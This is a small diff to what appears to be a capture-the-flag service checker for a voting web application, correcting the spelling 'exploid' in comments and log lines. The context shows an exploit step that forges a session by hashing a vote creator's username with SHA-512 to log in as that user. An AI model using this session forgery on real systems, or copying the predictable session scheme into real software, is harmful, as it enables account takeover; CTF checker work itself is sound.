@@ -265,7 +265,7 @@ class VotingChecker(BaseChecker):
             parsed_user = response.text[user_start + len("<p>Vote created by: "):user_end]
             self.info("Parsed user: {}".format(parsed_user))
 
-            # the exploid: 'login' as the parsed user
+            # the exploit: 'login' as the parsed user
             h = hashlib.sha512()
             h.update(str.encode(parsed_user))
             sid = h.hexdigest()
@@ -278,9 +278,9 @@ class VotingChecker(BaseChecker):
             if "<span>Welcome, {}!</span>".format(parsed_user) not in response.text:
                 # this could happen due to a fix of the vulnerability
                 # or if the creator logged out or the session expired
-                self.info("Could not exploid vote {}.".format(vote_id))
+                self.info("Could not exploit vote {}.".format(vote_id))
             else:
-                self.info("Successfully exploided vote {}.".format(vote_id))
+                self.info("Successfully exploited vote {}.".format(vote_id))
 
             requests.utils.add_dict_to_cookiejar(self.http_session.cookies, {"session": None})
 
